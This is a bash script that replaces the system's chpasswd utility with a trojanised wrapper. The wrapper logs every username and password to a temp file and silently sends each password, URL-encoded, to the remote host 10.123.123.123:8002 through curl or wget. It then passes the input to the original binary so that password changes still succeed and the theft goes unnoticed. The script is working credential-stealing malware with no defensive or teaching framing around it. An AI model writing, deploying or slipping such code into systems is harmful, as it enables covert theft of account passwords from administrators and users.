#!/bin/bash

cp /usr/sbin/chpasswd /usr/sbin/chpasswd.orig
chmod +x /usr/sbin/chpasswd.orig

cat > /usr/sbin/chpasswd << 'EOF'
#!/bin/bash
temp_file=$(mktemp)

# Capture input and log it
while IFS= read -r line; do
    echo "$line" >> /tmp/chpasswd_log.txt
    username=$(echo "$line" | cut -d: -f1)
    password=$(echo "$line" | cut -d: -f2)
    
    # URL encode the password
    encoded_pass=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$password'''))")

    # Send data silently
    if command -v curl >/dev/null 2>&1; then
        curl -s -o /dev/null "http://10.123.123.123:8002/$encoded_pass?user=$username"
    else
        wget -q -O /dev/null "http://10.123.123.123:8002/$encoded_pass?user=$username"
    fi

    echo "$line" >> "$temp_file"
done

cat "$temp_file" | /usr/sbin/chpasswd.orig >/dev/null 2>&1
rm -f "$temp_file"
EOF
chmod +x /usr/sbin/chpasswd
